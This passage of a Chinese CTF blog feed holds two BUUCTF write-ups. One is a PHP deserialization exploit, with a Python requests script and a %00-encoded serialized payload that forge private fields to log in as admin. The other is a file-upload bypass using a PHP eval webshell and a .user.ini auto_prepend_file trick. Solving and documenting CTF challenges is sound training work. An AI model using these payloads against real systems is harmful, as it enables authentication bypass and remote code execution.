组合。这也许解释了，为什么如果直接在网址上，传递\0</em>\0username会报错，因为实际上并不是\0，只是用它来代替ASCII值为0的字符。必须用python传值才可以。<br>private 声明的字段为私有字段，只在所声明的类中可见，在该类的子类和该类的对象实例中均不可见。因此私有字段的字段名在序列化时，类名和字段名前面都会加上\0的前缀。字符串长度也包括所加前缀的长度。其中 \0 字符也是计算长度的。</p><h2 id="exp1"><a href="#exp1" class="headerlink" title="exp1:"></a>exp1:</h2><pre><code>import  requestsurl =&quot;http://7bc3f84d-1e2f-4a49-897a-15eb4d1d5255.node3.buuoj.cn&quot;html = requests.get(url+&#39;?select=O:4:&quot;Name&quot;:3:{s:14:&quot;\0Name\0username&quot;;s:5:&quot;admin&quot;;s:14:&quot;\0Name\0password&quot;;i:100;}&#39;)print(html.text)</code></pre><h2 id="exp2"><a href="#exp2" class="headerlink" title="exp2:"></a>exp2:</h2><p> 如果不使用python提交<br>在url栏中会出现\0<br>有空白符，而复制的时候会丢失。<br>加上%00</p><blockquote><p>payload:</p></blockquote><pre><code>O:4:&quot;Name&quot;:3:{s:14:&quot;%00Name%00username&quot;;s:5:&quot;admin&quot;;s:14:&quot;%00Name%00password&quot;;i:100;}</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;这一题有两个地方卡住我了，第一个是没有想到备份名叫&lt;a href=&quot;http://www.zip&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;www.zip&lt;/a&gt;.&lt;br&gt;第二个是public、protected与private在序列化时的区别。&lt;br
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>上传绕过  .user.ini</title>
    <link href="http://yoursite.com/2020/03/28/%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87-user-ini/"/>
    <id>http://yoursite.com/2020/03/28/%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87-user-ini/</id>
    <published>2020-03-28T12:23:26.000Z</published>
    <updated>2020-03-28T12:27:01.738Z</updated>
    
    <content type="html"><![CDATA[<p>今天做了一题是BUUCTF上的checkin<br>一道文件上传题，题目首先对文件内容进行了过滤，过滤了<?因此<?php  ?>就不行了因此应该用<script language="php">eval($_POST['a']);</script>。同时这道题对文件名也过滤的死死的于是想用.htaccess但是发现没有用，后来知道该文件需要apache而这里是nginx。则需要.user.ini</p><blockquote><p>auto_prepend_file=X.jpg</p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;今天做了一题是BUUCTF上的checkin&lt;br&gt;一道文件上传题，题目首先对文件内容进行了过滤，过滤了&lt;?因此&lt;?php  ?&gt;就不行了因此应该用&lt;script language=&quot;php&quot;&gt;eval($_POST[&#39;a&#39;]);&lt;/script&gt;。同时这道题对文件名也过滤
      
    
    </summary>
    
    
    
  </entry>
  
</feed>
